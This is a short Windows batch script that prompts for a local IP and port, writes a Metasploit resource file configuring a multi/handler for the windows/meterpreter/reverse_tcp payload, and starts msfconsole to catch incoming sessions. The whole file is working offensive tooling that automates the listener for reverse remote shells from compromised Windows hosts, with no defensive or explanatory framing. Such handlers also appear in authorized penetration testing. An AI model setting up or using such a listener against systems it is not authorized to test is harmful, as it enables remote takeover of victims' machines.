@echo off
echo [*] Auto Metasploit Handler Launcher
echo.

:: Get LHOST and LPORT from user
set /p LHOST=Enter your local IP (LHOST): 
set /p LPORT=Enter your local port (LPORT): 

:: Create Metasploit resource file
echo use exploit/multi/handler > handler.rc
echo set payload windows/meterpreter/reverse_tcp >> handler.rc
echo set LHOST %LHOST% >> handler.rc
echo set LPORT %LPORT% >> handler.rc
echo exploit -j >> handler.rc
echo sessions >> handler.rc

:: Start Metasploit with the resource file
start msfconsole -r handler.rc
